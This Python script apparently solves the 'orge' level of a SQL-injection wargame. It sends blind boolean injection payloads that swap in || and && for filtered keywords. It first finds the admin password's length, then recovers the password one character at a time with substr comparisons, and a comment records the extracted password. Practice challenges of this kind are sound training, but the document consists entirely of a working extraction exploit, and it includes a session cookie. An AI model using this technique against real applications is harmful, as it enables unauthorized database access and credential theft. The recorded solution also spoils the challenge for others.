import requests

url = "http://los.rubiya.kr/orge_bad2f25db233a7542be75844e314e9f3.php"

headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}
pw_length=0
pw = ""

# Found pw length
for i in range(1,20):
    params = {
        "pw":"' || id='admin' && length(pw)=%d || '0#" % i
        #"pw":"' || or id='admin' && length(pw)=%d#" % i
        #"pw":"' || id='admin' && length(pw)=%d#--#" % i
        #"pw":"' || id='admin' and length(pw)=%d || '0" % i
        #query = "1'||id='admin'&&length(pw)=8#--#"
    }

    res = requests.get(url, params=params, headers=headers)
    print "[Try password length]: %d" % i
    
    if "Hello admin" in res.content:
        print "Found It!"
        pw_length = i
        print "PW Length: %d" % pw_length
        break

# Found admin password 7b751aec
for i in range(len(pw)+1,pw_length+1):
    for j in range(0x30,0x7f):
        print "Try index: %d:\'%c\'" % (i,j)
        #print "pw' or substr(pw,%d,1) = char(0x%x)" % (i,j)
        params = {
            #"pw":"' or substr(pw,%d,1) = 0x%x#" % (i,j)
            #"pw":"' or id='admin' and substr(pw,%d,1) = char(0x%x)#" % (i,j)
            "pw":"' || id='admin' && substr(pw,%d,1) = 0x%x#" % (i,j)
        }
        res = requests.get(url, headers=headers, params=params)
        if "Hello admin" in res.content:
            print "Foundit!"
            pw = pw+chr(j)
            print pw.lower()
            break
